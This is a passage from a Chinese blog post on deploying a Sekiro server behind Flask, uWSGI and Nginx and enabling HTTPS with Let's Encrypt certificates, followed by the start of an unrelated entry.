registry.cn-beijing.aliyuncs.com/virjar/sekiro-server:latest</span><br></pre></td></tr></table></figure><ul><li>Sekiro服务端（新版），服务器开放端口：5620</li></ul><p><a href="https://github.com/virjar/sekiro">新版</a></p><p><a href="https://oss.virjar.com/sekiro/sekiro-demo">下载demo</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要Java环境</span></span><br><span class="line">nohup sh /bin/sekiro.sh</span><br></pre></td></tr></table></figure><h3 id="二、升级HTTPS"><a href="#二、升级HTTPS" class="headerlink" title="二、升级HTTPS"></a>二、升级HTTPS</h3><p>由于本人Java知识匮乏，所以使用Flask+uWSGI构建服务端，服务器需要有Java环境。</p><h4 id="0-启动sekiro"><a href="#0-启动sekiro" class="headerlink" title="0.启动sekiro"></a>0.启动sekiro</h4><p>在项目根目录下创建文件：api_sekiro_run.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">ps -ef | grep sekiro-service-demo | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line"></span><br><span class="line">sleep 3</span><br><span class="line"></span><br><span class="line">nohup sh /srv/api_sekiro/bin/sekiro.sh &gt;&gt;/srv/api_sekiro/logs/nohup_sekiro_server.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>启动sekiro</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /srv/api_sekiro &amp;&amp; sh /srv/api_sekiro/api_sekiro_run.sh</span><br></pre></td></tr></table></figure><h4 id="1-flask"><a href="#1-flask" class="headerlink" title="1.flask"></a>1.flask</h4><p>在项目根目录下创建文件：manage.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"><span class="keyword">from</span> flask_script <span class="keyword">import</span> Manager, Server</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line">manager = Manager(app)</span><br><span class="line">manager.add_command(<span class="string">&quot;runserver&quot;</span>, Server(<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">11002</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sekiro</span>():</span><br><span class="line">    os.popen(<span class="string">&quot;cd /srv/api_sekiro &amp;&amp; sh /srv/api_sekiro/api_sekiro_run.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stop_sekiro</span>():</span><br><span class="line">    os.popen(</span><br><span class="line">            <span class="string">&quot;ps -ef | grep sekiro-service-demo | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>], strict_slashes=<span class="literal">False</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/start&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>], strict_slashes=<span class="literal">False</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start_sekiro()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;sekiro服务启动成功&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;sekiro服务启动失败&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/stop&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>], strict_slashes=<span class="literal">False</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stop</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        stop_sekiro()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;sekiro服务关闭成功&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;sekiro服务关闭失败&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    manager.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在创建证书之前，在项目根目录下创建文件夹：&#x2F;templates，在该文件夹下创建文件：index.html</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sekiro服务<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/sekiro_web_client.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/favicon.ico&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/x-icon&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/favicon.ico&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/x-icon&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>接口说明<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        1. /start</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        启动sekiro服务</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        2. /stop</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        关闭sekiro服务</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        3. /business-demo/groupList</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        sekiro服务的连接列表</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        4. wss://sekiro.xxx.com/business-demo/register?group=test&amp;clientId=xxx</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        客户端连接服务端</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        5. https://sekiro.xxx.com/business-demo/invoke?group=test&amp;action=xxx&amp;xxx=xxx</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        服务端调用客户端</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Sekiro服务部署<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        1. Sekiro服务端（新版），服务器开放端口：5620</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        https://sekiro.virjar.com/sekiro-doc/02_server_deploy/1.DemoServer.html.com/virjar/sekiro-server:latest</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        2. Sekiro服务端（旧版），服务器开放端口：5600-5603</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        docker run --restart=always -d -p 5600:5600 -p 5601:5601 -p 5602:5602 -p 5603:5603 --name sekiro-server registry.cn-beijing.aliyuncs.com/virjar/sekiro-server:latest</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-uwsgi"><a href="#2-uwsgi" class="headerlink" title="2.uwsgi"></a>2.uwsgi</h4><ul><li>配置uwsgi.ini文件</li></ul><p>在项目文件夹与manage.py同级的目录下创建uwsgi.ini，文件内容如下（注意路径）：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">uwsgi监听的socket，一会儿配置Nginx会用到</span></span><br><span class="line">socket = 127.0.0.1:11002</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在app加载前切换到该目录，设置为Flask项目根目录</span></span><br><span class="line">chdir = /srv/api_sekiro</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加载指定的python WSGI模块，设置为Flask项目的manage文件</span></span><br><span class="line">wsgi-file = ./manage.py</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定app对象实例</span></span><br><span class="line">callable = app</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动一个master进程来管理其他进程</span></span><br><span class="line">master = true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工作的进程数</span></span><br><span class="line">processes = 2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每个进程下的线程数量</span></span><br><span class="line">threads = 4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当服务器退出的时候自动删除unix socket文件和pid文件</span></span><br><span class="line">vacuum = true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使进程在后台运行，并将日志打到指定的日志文件或者udp服务器</span></span><br><span class="line">daemonize = /srv/api_sekiro/uwsgi.log</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>加载配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uwsgi --ini uwsgi_api_sekiro.ini</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">出现getting INI configuration from uwsgi.ini（成功）</span></span><br></pre></td></tr></table></figure><ul><li><p>项目有更新的时候，需要先关闭uwsgi然后重启即可</p></li><li><p>基本命令</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动uwsgi服务器</span></span><br><span class="line">uwsgi --ini uwsgi_api_sekiro.ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看uwsgi是否运行</span></span><br><span class="line">ps -aux | grep uwsgi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口号占用</span></span><br><span class="line">netstat -anp | grep 5050</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结束uwsgi进程</span></span><br><span class="line">pgrep uwsgi | xargs kill -s 9</span><br></pre></td></tr></table></figure><h4 id="3-Let’s-Encrypt免费证书"><a href="#3-Let’s-Encrypt免费证书" class="headerlink" title="3.Let’s Encrypt免费证书"></a>3.Let’s Encrypt免费证书</h4><p>在创建证书之前，在项目根目录下创建文件夹：&#x2F;.well-know，在该文件夹下创建文件：acme-challenge</p><h4 id="4-配置Nginx"><a href="#4-配置Nginx" class="headerlink" title="4.配置Nginx"></a>4.配置Nginx</h4><p>编辑配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/nginx/conf.d/sekiro.conf</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sekiro框架</span></span><br><span class="line">upstream sekiro_business_netty &#123;</span><br><span class="line">  server 127.0.0.1:5620;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网站配置</span></span><br><span class="line">server &#123;</span><br><span class="line">    # 设置监听端口</span><br><span class="line">    listen 80;</span><br><span class="line">    # 设置对外访问入口,可以是域名可以是公网IP</span><br><span class="line">    server_name sekiro.xxx.com;</span><br><span class="line">    # 设置虚拟主机的基本信息</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:11002;</span><br><span class="line">        uwsgi_read_timeout 60;</span><br><span class="line">    &#125;</span><br><span class="line">    # 静态文件设置</span><br><span class="line">    location /static &#123;</span><br><span class="line">        expires 30d;</span><br><span class="line">        alias /srv/api_sekiro/static/;</span><br><span class="line">    &#125;</span><br><span class="line">    # 创建Let’s Encrypt免费SSL证书临时文件</span><br><span class="line">    location /.well-known/acme-challenge &#123;</span><br><span class="line">        alias /srv/api_sekiro/.well-known/acme-challenge;</span><br><span class="line">    &#125;</span><br><span class="line">    # sekiro框架</span><br><span class="line">    location /business-demo &#123;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_read_timeout 500;</span><br><span class="line">        proxy_connect_timeout 300;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_set_header Upgrade            $http_upgrade;</span><br><span class="line">        proxy_set_header Host               $http_host;</span><br><span class="line">        proxy_set_header X-Real-IP          $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For    $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto  $scheme;</span><br><span class="line">        proxy_pass http://sekiro_business_netty;</span><br><span class="line">    &#125;</span><br><span class="line">    # 允许网段</span><br><span class="line">    allow all;</span><br><span class="line">    # 设置访问的语言编码</span><br><span class="line">    charset UTF-8;</span><br><span class="line">    # nginx的超时参数设置为60秒</span><br><span class="line">    send_timeout 60;</span><br><span class="line">    # 实IP在X-Forwarded-For请求头中</span><br><span class="line">    real_ip_header X-Real-IP;</span><br><span class="line">    # X-Forwarded-For请求头中的最后一个IP当成真实IP</span><br><span class="line">    real_ip_recursive off;</span><br><span class="line">    # 设置fastcgi缓冲区为8块128k大小的空间</span><br><span class="line">    fastcgi_buffers 8 128k;</span><br><span class="line">    # 上传文件大小限制,默认1m</span><br><span class="line">    client_max_body_size 0;</span><br><span class="line">    # 访问日志记录</span><br><span class="line">    access_log /var/log/nginx/sekiro_access.log;</span><br><span class="line">    # 错误日志记录</span><br><span class="line">    error_log /var/log/nginx/sekiro_error.log;</span><br><span class="line">    # 开启gzip</span><br><span class="line">    gzip on;</span><br><span class="line">    # 是否在http header中添加Vary:Accept-Encoding</span><br><span class="line">    gzip_vary on;</span><br><span class="line">    # 设置压缩所需要的缓冲区大小</span><br><span class="line">    gzip_buffers 32 4K;</span><br><span class="line">    # gzip 压缩级别,1-9,数字越大压缩的越好,也越占用CPU时间</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    # 启用gzip压缩的最小文件,小于设置值的文件将不会压缩</span><br><span class="line">    gzip_min_length 100;</span><br><span class="line">    # 配置禁用gzip条件,支持正则</span><br><span class="line">    gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line">    # 进行压缩的文件类型</span><br><span class="line">    gzip_types application/javascript text/css text/xml;</span><br><span class="line">    # HTTP严格传输安全的max-age需要大于15768000秒</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-重启nginx，以便生效"><a href="#5-重启nginx，以便生效" class="headerlink" title="5.重启nginx，以便生效"></a>5.重启nginx，以便生效</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos7</span></span><br><span class="line">systemctl restart nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu16.04</span></span><br><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><h4 id="6-安装certbot"><a href="#6-安装certbot" class="headerlink" title="6.安装certbot"></a>6.安装certbot</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos7</span></span><br><span class="line">yum install -y certbot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu16.04</span></span><br><span class="line">sudo add-apt-repository ppa:certbot/certbot</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install certbot</span><br></pre></td></tr></table></figure><h4 id="7-签发SSL证书"><a href="#7-签发SSL证书" class="headerlink" title="7.签发SSL证书"></a>7.签发SSL证书</h4><p>两种生成证书的方式</p><ul><li>andalone</li></ul><p>certbot会启动自带的nginx（如果服务器上已经有nginx或apache运行，需要停止已有的nginx或apache）生成证书。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certbot certonly --standalone -d sekiro.xxx.com</span><br></pre></td></tr></table></figure><ul><li>webroot(推荐)</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certbot certonly --webroot -w /srv/api_sekiro -d sekiro.xxx.com</span><br></pre></td></tr></table></figure><p>-w：指定项目绝对路径。</p><p>-d：指定生成证书域名，不可以直接写IP。</p><p>这条命令的输出类似于这样(Congratulations)为成功。</p><p>证书位置：&#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;sekiro.xxx.com&#x2F;fullchain.pem</p><p>私钥位置：&#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;sekiro.xxx.com&#x2F;privkey.pem</p><h4 id="8-生成前向安全性密钥"><a href="#8-生成前向安全性密钥" class="headerlink" title="8.生成前向安全性密钥"></a>8.生成前向安全性密钥</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/letsencrypt/live</span><br><span class="line">openssl dhparam 2048 -out dhparam.pem</span><br></pre></td></tr></table></figure><h4 id="9-将https配置进Nginx"><a href="#9-将https配置进Nginx" class="headerlink" title="9.将https配置进Nginx"></a>9.将https配置进Nginx</h4><ul><li>配置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sekiro框架</span></span><br><span class="line">upstream sekiro_business_netty &#123;</span><br><span class="line">  server 127.0.0.1:5620;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网站配置</span></span><br><span class="line">server &#123;</span><br><span class="line">    # 设置监听端口</span><br><span class="line">    listen 80;</span><br><span class="line">    # 设置监听端口,开启https,默认端口</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    # 设置对外访问入口,可以是域名可以是公网IP</span><br><span class="line">    server_name sekiro.xxx.com;</span><br><span class="line">    # HTTP请求301永久跳转到HTTPS</span><br><span class="line">    if ($server_port = 80) &#123;</span><br><span class="line">        return 301 https://$server_name$request_uri;</span><br><span class="line">    &#125;</span><br><span class="line">    # 设置虚拟主机的基本信息</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:11002;</span><br><span class="line">        uwsgi_read_timeout 60;</span><br><span class="line">    &#125;</span><br><span class="line">    # 静态文件设置</span><br><span class="line">    location /static &#123;</span><br><span class="line">        expires 30d;</span><br><span class="line">        alias /srv/api_sekiro/static/;</span><br><span class="line">    &#125;</span><br><span class="line">    # 创建Let’s Encrypt免费SSL证书临时文件</span><br><span class="line">    location /.well-known/acme-challenge &#123;</span><br><span class="line">        alias /srv/api_sekiro/.well-known/acme-challenge;</span><br><span class="line">    &#125;</span><br><span class="line">    # sekiro框架</span><br><span class="line">    location /business-demo &#123;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_read_timeout 500;</span><br><span class="line">        proxy_connect_timeout 300;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_set_header Upgrade            $http_upgrade;</span><br><span class="line">        proxy_set_header Host               $http_host;</span><br><span class="line">        proxy_set_header X-Real-IP          $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For    $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto  $scheme;</span><br><span class="line">        proxy_pass http://sekiro_business_netty;</span><br><span class="line">    &#125;</span><br><span class="line">    # session会话的缓存类型和大小</span><br><span class="line">    ssl_session_cache shared:SSL:10m;</span><br><span class="line">    # ession会话的超时时间</span><br><span class="line">    ssl_session_timeout 10m;</span><br><span class="line">    # 依赖SSLv3和TLSv1协议的服务器密码将优先于客户端密码</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    # 证书位置</span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/sekiro.xxx.com/fullchain.pem;</span><br><span class="line">    # 私钥位置</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/sekiro.xxx.com/privkey.pem;</span><br><span class="line">    # 前向安全性,DH-Key交换密钥文件位置</span><br><span class="line">    ssl_dhparam /etc/letsencrypt/live/dhparam.pem;</span><br><span class="line">    # PCI DSS支付卡行业安全标准,禁用不安全的SSLv1 2 3,只使用TLS,PCI安全标准委员会规定开启TLS1.0将导致PCI DSS不合规</span><br><span class="line">    ssl_protocols TLSv1.1 TLSv1.2;</span><br><span class="line">    # 需要配置符合PFS规范的加密套件</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4:!DH:!DHE;</span><br><span class="line">    # 允许网段</span><br><span class="line">    allow all;</span><br><span class="line">    # 设置访问的语言编码</span><br><span class="line">    charset UTF-8;</span><br><span class="line">    # nginx的超时参数设置为60秒</span><br><span class="line">    send_timeout 60;</span><br><span class="line">    # 实IP在X-Forwarded-For请求头中</span><br><span class="line">    real_ip_header X-Real-IP;</span><br><span class="line">    # X-Forwarded-For请求头中的最后一个IP当成真实IP</span><br><span class="line">    real_ip_recursive off;</span><br><span class="line">    # 设置fastcgi缓冲区为8块128k大小的空间</span><br><span class="line">    fastcgi_buffers 8 128k;</span><br><span class="line">    # 上传文件大小限制,默认1m</span><br><span class="line">    client_max_body_size 0;</span><br><span class="line">    # 访问日志记录</span><br><span class="line">    access_log /var/log/nginx/sekiro_access.log;</span><br><span class="line">    # 错误日志记录</span><br><span class="line">    error_log /var/log/nginx/sekiro_error.log;</span><br><span class="line">    # 开启gzip</span><br><span class="line">    gzip on;</span><br><span class="line">    # 是否在http header中添加Vary:Accept-Encoding</span><br><span class="line">    gzip_vary on;</span><br><span class="line">    # 设置压缩所需要的缓冲区大小</span><br><span class="line">    gzip_buffers 32 4K;</span><br><span class="line">    # gzip 压缩级别,1-9,数字越大压缩的越好,也越占用CPU时间</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    # 启用gzip压缩的最小文件,小于设置值的文件将不会压缩</span><br><span class="line">    gzip_min_length 100;</span><br><span class="line">    # 配置禁用gzip条件,支持正则</span><br><span class="line">    gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line">    # 进行压缩的文件类型</span><br><span class="line">    gzip_types application/javascript text/css text/xml;</span><br><span class="line">    # HTTP严格传输安全的max-age需要大于15768000秒</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>重启nginx，以便生效</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到项目目录下运行</span></span><br><span class="line">uwsgi --ini uwsgi_api_sekiro.ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启nginx服务</span></span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Android逆向 </tag>
            
            <tag> JS逆向 </tag>
            
            <tag> HTTPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No119：Linux常用解压缩命令</title>
      <link href="/posts/46ab0914.html"/>
      <url>/posts/46ab0914.html</url>
      
